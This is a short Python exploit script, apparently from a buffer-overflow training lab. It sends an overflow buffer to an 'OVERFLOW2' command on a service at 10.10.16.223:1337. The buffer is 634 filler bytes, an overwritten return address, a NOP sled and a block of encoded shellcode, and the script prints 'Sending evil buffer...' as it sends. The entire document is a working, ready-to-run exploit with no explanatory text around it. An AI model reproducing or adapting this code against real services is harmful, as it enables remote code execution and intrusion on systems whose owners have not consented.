#!/usr/bin/env python3

import socket

ip = "10.10.16.223"
port = 1337

prefix = "OVERFLOW2 "
offset = 634
overflow = "A" * offset
retn = "\xaf\x11\x50\x62" # 625011af
padding = "\x90" * 16
payload = ("\xfc\xbb\x8c\x28\x77\xd0\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x70\xc0\xf5\xd0\x88"
"\x11\x9a\x59\x6d\x20\x9a\x3e\xe6\x13\x2a\x34\xaa\x9f\xc1\x18"
"\x5e\x2b\xa7\xb4\x51\x9c\x02\xe3\x5c\x1d\x3e\xd7\xff\x9d\x3d"
"\x04\xdf\x9c\x8d\x59\x1e\xd8\xf0\x90\x72\xb1\x7f\x06\x62\xb6"
"\xca\x9b\x09\x84\xdb\x9b\xee\x5d\xdd\x8a\xa1\xd6\x84\x0c\x40"
"\x3a\xbd\x04\x5a\x5f\xf8\xdf\xd1\xab\x76\xde\x33\xe2\x77\x4d"
"\x7a\xca\x85\x8f\xbb\xed\x75\xfa\xb5\x0d\x0b\xfd\x02\x6f\xd7"
"\x88\x90\xd7\x9c\x2b\x7c\xe9\x71\xad\xf7\xe5\x3e\xb9\x5f\xea"
"\xc1\x6e\xd4\x16\x49\x91\x3a\x9f\x09\xb6\x9e\xfb\xca\xd7\x87"
"\xa1\xbd\xe8\xd7\x09\x61\x4d\x9c\xa4\x76\xfc\xff\xa0\xbb\xcd"
"\xff\x30\xd4\x46\x8c\x02\x7b\xfd\x1a\x2f\xf4\xdb\xdd\x50\x2f"
"\x9b\x71\xaf\xd0\xdc\x58\x74\x84\x8c\xf2\x5d\xa5\x46\x02\x61"
"\x70\xc8\x52\xcd\x2b\xa9\x02\xad\x9b\x41\x48\x22\xc3\x72\x73"
"\xe8\x6c\x18\x8e\x7b\x99\xd9\xb8\xa3\xf5\xe3\xb8\x42\x5a\x6d"
"\x5e\x0e\x72\x3b\xc9\xa7\xeb\x66\x81\x56\xf3\xbc\xec\x59\x7f"
"\x33\x11\x17\x88\x3e\x01\xc0\x78\x75\x7b\x47\x86\xa3\x13\x0b"
"\x15\x28\xe3\x42\x06\xe7\xb4\x03\xf8\xfe\x50\xbe\xa3\xa8\x46"
"\x43\x35\x92\xc2\x98\x86\x1d\xcb\x6d\xb2\x39\xdb\xab\x3b\x06"
"\x8f\x63\x6a\xd0\x79\xc2\xc4\x92\xd3\x9c\xbb\x7c\xb3\x59\xf0"
"\xbe\xc5\x65\xdd\x48\x29\xd7\x88\x0c\x56\xd8\x5c\x99\x2f\x04"
"\xfd\x66\xfa\x8c\x1d\x85\x2e\xf9\xb5\x10\xbb\x40\xd8\xa2\x16"
"\x86\xe5\x20\x92\x77\x12\x38\xd7\x72\x5e\xfe\x04\x0f\xcf\x6b"
"\x2a\xbc\xf0\xb9\x2a\x42\x0f\x42")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")